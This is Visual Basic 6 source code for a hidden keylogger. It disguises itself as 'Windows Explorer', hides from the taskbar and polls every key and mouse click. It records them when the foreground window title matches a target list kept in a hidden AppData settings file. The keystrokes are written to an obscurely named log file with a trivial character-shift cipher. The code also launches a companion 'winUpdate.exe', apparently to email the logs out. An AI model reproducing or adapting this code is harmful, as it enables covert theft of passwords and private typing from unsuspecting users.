VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Windows Explorer"
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   6
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   4560
      Top             =   720
   End
   Begin VB.Timer Timer2 
      Interval        =   450
      Left            =   3960
      Top             =   0
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   285
      Left            =   240
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   120
      Width           =   2775
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   1935
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   480
      Width           =   3735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'Special Folder path Import
Public Enum mceIDLPaths
    CSIDL_APPDATA = &H1A ' C:\WINNT\Profiles\username\Application Data.
    CSIDL_WINDOWS = &H24 ' C:\WINNT.
End Enum
Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean

'Active windowtitle part
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long

'keylogger part
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer 'caps keystate


'Loadsetting variable declaration
Dim LPath, Pwd, PCDec As String

'Prevent only Titles in LOG
Dim HasSomeText As Boolean 'Log wil not recorded if HasSomeText=False



Private Sub Form_Load()

If App.PrevInstance = True Then
    Shell (GetSpecialFolderA(CSIDL_WINDOWS) & "explorer.exe"), vbNormalFocus 'This program is already running!
    End
    Exit Sub
End If

Me.Left = Screen.Width - Me.Width
Me.Top = Screen.Height - Me.Height

App.TaskVisible = False

Timer2.Enabled = True
Call startLogging

End Sub
Private Sub startLogging()

Call LoadSetting

LPath = LPath & "\browse" & Format$(Now, "dd" & "mm" & "yy") & "z.nkl"

If Dir(LPath) = "" Then
'Write initials
Open LPath For Append As 1
    If Pwd = "" Then    'To avoid the null string encrypt error.
    Write #1, Chr(155), Time, Date, Encrypt(PCDec, 25), "", Encrypt(App.Revision, 20)
    Else
    Write #1, Chr(155), Time, Date, Encrypt(PCDec, 25), Encrypt(Pwd, 20), Encrypt(App.Revision, 20)
    End If
Close #1
End If

End Sub



Private Sub LoadSetting()
Dim SendTo As String
If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") <> "" Then 'setting file found then
    
    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") For Input As 1
    Input #1, LPath, Pwd, PCDec, SendTo
    Close #1
Else    'setting not found
    MsgBox "Settings not found", , "Error": End
End If

'If Path is from Username root use u:
If Left(LPath, 2) = "u:" Then LPath = Environ$("USERPROFILE") & Mid(LPath, 3, Len(LPath) - 2)
'To disable sending Email set SendTo=none or delete WinUpdate.exe
If LCase(SendTo) <> "none" And Dir(App.Path & "\winUpdate.exe") <> "" Then Shell App.Path & "\winUpdate.exe"

End Sub

Private Sub Timer1_Timer()


Dim i As Integer
Dim Result As Integer
For i = 1 To 255
 Result = GetAsyncKeyState(i)
If Result = -32767 Then
    
    If (i >= 65 And i <= 90) Or i = 32 Then         'alphabets 32 for space bar
        Text1.Text = Text1.Text + CorrectCase(i)
        HasSomeText = True  'Something is typed
    Else                                            'non alphabets
        If i = 1 Then                               'it is Click
        Text1.Text = Text1.Text & "[C]"             'Print [C] to show click
        ElseIf i = 8 Then                           'Key pressed is Backspace
               ' delete last letter becoz Backspace pressed
                If Len(Text1) > 0 And Right(Text1.Text, 1) <> "]" And Right(Text1.Text, 1) <> Chr(13) Then Text1.Text = Left(Text1.Text, Len(Text1) - 1)
        Else
            Text1.Text = Text1.Text + CheckShift(i)
            HasSomeText = IsTextKey(i)
        End If
    End If

End If
Next i
End Sub
Private Function IsTextKey(KeyNo As Integer) As Boolean

Select Case KeyNo
Case 48 To 57
IsTextKey = True
Case 96 To 105
IsTextKey = True
Case 107 To 111
IsTextKey = True
Case 186 To 221
IsTextKey = True
Case Else
IsTextKey = False
End Select

End Function
'If ActiveWindow Title changes then Records text from text box to file
Private Sub Text2_Change()

If HasSomeText = True Then
    If Trim(Text1) <> "" Then Call Appendnow
End If

HasSomeText = False

Dim t1, t2, t3, t4, t5 As String

If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") <> "" Then 'setting file found then
    
    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Input As 1
    Input #1, t1, t2, t3, t4, t5
    Close #1

Else    'setting not found
    MsgBox "Titles not found", , "Error": End
End If



If Left(LCase(Text2), Len(t1)) = LCase(t1) Or Left(LCase(Text2), Len(t2)) = LCase(t2) Or Left(LCase(Text2), Len(t3)) = LCase(t3) Or Left(LCase(Text2), Len(t4)) = LCase(t4) Or Left(LCase(Text2), Len(t5)) = LCase(t5) Then
    Text1.Text = Time & " : " & Text2.Text & vbCrLf
    Timer1.Enabled = True
Else
    Timer1.Enabled = False
End If


End Sub
'************************encrypting and Recording to file use of Append*********
Private Sub Appendnow()
'Call startLogging   'Loads New LPath

If Dir(LPath) <> "" Then
        Open LPath For Append As #1
        If Pwd = "" Then
        Print #1, Text1         'Dont encrypt if no password
        Else
        Print #1, Encrypt(Text1, 20)
        End If
        Text1.Text = ""
        Close #1
Else
        MsgBox "Log Directory Unavailable OR Unaccessible.", vbCritical, "Logging Stopped": End
End If
End Sub
'***********************


'******************KEYCASEPART***********
Function CorrectCase(ByVal b As Integer) As String
Dim tmp As Boolean
tmp = GetKeyState(vbKeyCapital)
If tmp = 1 Then         'The Caps Lock Is On
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    CorrectCase = LCase(Chr(b)) 'print small letter
    Else
    CorrectCase = UCase(Chr(b)) 'print capital letter
    End If
Else            'The Caps Lock Is Off
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    CorrectCase = UCase(Chr(b)) 'print capital letter
    Else
    CorrectCase = LCase(Chr(b)) 'print small letter
    End If
End If
End Function

'''**********************shiftkey****************
Private Function CheckShift(ByVal b As Integer) As String
    If GetAsyncKeyState(vbKeyShift) Then
       CheckShift = shiftkeydw(b)
    Else
        CheckShift = shiftkeyup(b)
    End If
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeyup(ByVal b As Integer) As String
Select Case b
Case 48 To 57  'number keys above QWERTY
    shiftkeyup = b - 48
Case 96 To 105  'Number keys from numpad
    shiftkeyup = b - 96
Case 192
    shiftkeyup = "`"
Case 189
    shiftkeyup = "-"
Case 187
    shiftkeyup = "="
Case 219
    shiftkeyup = "["
Case 186
    shiftkeyup = ";"
Case 222
    shiftkeyup = "'"
Case 221
    shiftkeyup = "]"
Case 188
    shiftkeyup = ","
Case 190
    shiftkeyup = "."
Case 191
    shiftkeyup = "/"
Case 220
    shiftkeyup = "\"
Case 111
    shiftkeyup = "/"
Case 106
    shiftkeyup = "*"
Case 109
    shiftkeyup = "-"
Case 107
    shiftkeyup = "+"
Case 110
    shiftkeyup = "."


Case Else           'If key doesnt recognised ascii code will be displayed
    shiftkeyup = locatekey(b)
End Select
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeydw(ByVal b As Integer) As String
Select Case b
Case 48 'number keys above QWERTY
    shiftkeydw = ")"
Case 49
    shiftkeydw = "!"
Case 50
    shiftkeydw = "@"
Case 51
    shiftkeydw = "#"
Case 52
    shiftkeydw = "$"
Case 53
    shiftkeydw = "%"
Case 54
    shiftkeydw = "^"
Case 55
    shiftkeydw = "&"
Case 56
    shiftkeydw = "*"
Case 57
    shiftkeydw = "("

Case 96 To 105  'Number keys from numpad
    shiftkeydw = b - 96

Case 192
    shiftkeydw = "~"
Case 189
    shiftkeydw = "_"
Case 187
    shiftkeydw = "+"
Case 219
    shiftkeydw = "{"
Case 186
    shiftkeydw = ":"
Case 222
    shiftkeydw = """"
Case 221
    shiftkeydw = "}"
Case 188
    shiftkeydw = "<"
Case 190
    shiftkeydw = ">"
Case 191
    shiftkeydw = "?"
Case 220
    shiftkeydw = "|"
Case 111
    shiftkeydw = "/"
Case 106
    shiftkeydw = "*"
Case 109
    shiftkeydw = "-"
Case 107
    shiftkeydw = "+"


Case Else           'If key is not symbol then locate its name
    shiftkeydw = locatekey(b)
End Select

End Function
Private Function locatekey(ByVal b As Integer) As String

Select Case b
Case 27
    locatekey = "[ESC]"
Case 9
    locatekey = "[TAB]"
Case 20
    locatekey = "[CAPS]"
Case 16         'shift key
    locatekey = ""
Case 160        'Left shift key
    locatekey = ""
Case 161        'Right shift key
    locatekey = ""
Case 112 To 123
    locatekey = "[F" & b - 111 & "]"
Case 13
    locatekey = "[ENTR]"
Case 91
    locatekey = "[LWND]"
Case 92
    locatekey = "[RWND]"
Case 18            'alt KEY DEFECT
    locatekey = ""
Case 164
    locatekey = "[LALT]"
Case 165
    locatekey = "[RALT]"
    
Case 17         'Ctrl key defect
    locatekey = ""
Case 162
    locatekey = "[LCTRL]"
Case 163
    locatekey = "[RCTRL]"

Case 2
    locatekey = "[RC]"
Case 93
    locatekey = "[KRC]"
'Case 8
 '   locatekey = "[BS]"
Case 46
    locatekey = "[DEL]"
Case 45
    locatekey = "[INS]"
Case 36
    locatekey = "[HOME]"
Case 33
    locatekey = "[PAGEUP]"
Case 35
    locatekey = "[END]"
Case 34
    locatekey = "[PAGEDOWN]"
Case 37
    locatekey = "[LEFT]"
Case 38
    locatekey = "[UP]"
Case 39
    locatekey = "[RIGHT]"
Case 40
    locatekey = "[DOWN]"
Case 44
    locatekey = "[PRINTSCREEN]"
Case 145
    locatekey = "[SCRLCK]"
Case 19
    locatekey = "[PAUSE/BREAK]"
Case 144
    locatekey = "[NUMLCK]"
Case 12
    locatekey = "[5]"



Case Else
    locatekey = "[" & b & "]"
End Select
End Function


'*************Imports active w title***********
Private Sub Timer2_Timer()
Text2.Text = GetActiveWindowTitle(False)            'Get window title after 550 interval
End Sub


' ************************************Ativewindow title part******************************
' if GetParent = true then the parent window is returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hWnd As Long) As String
Dim l As Long
Dim S As String

l = GetWindowTextLength(hWnd)
S = Space(l + 1)

GetWindowText hWnd, S, l + 1

GetWindowTitle = Left$(S, l)
End Function

'IMPORT Special folder Path
Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String

Dim Ret As Long
Dim Trash As String: Trash = Space$(260)

    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
  
    GetSpecialFolderA = Trash
End Function
Private Function Encrypt(ByVal ThisText As String, encCode As Integer) As String
Dim i As Integer
For i = 1 To Len(ThisText)
Encrypt = Encrypt & Chr(Asc(Mid(ThisText, i, 1)) + encCode)
Next i
End Function
